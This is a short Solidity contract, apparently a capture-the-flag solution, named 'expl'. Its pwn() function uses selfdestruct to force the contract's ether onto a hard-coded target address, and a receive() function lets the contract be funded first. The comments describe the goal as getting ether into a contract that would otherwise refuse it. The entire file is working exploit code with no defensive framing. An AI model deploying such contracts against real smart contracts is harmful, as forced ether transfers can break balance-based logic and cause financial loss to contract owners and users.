pragma solidity ^0.8;


contract expl {
          	 // We just need a way to send the contract eth
           	 // selfdestruct -> destroys itself and sends it's funds to given address 
	function pwn() public {
		selfdestruct(payable(0xa7BBD70BE89D56121e4c239f0AE54bc1511544D8));
	}
		// get some funds and call pwn
	receive() external payable {}
}
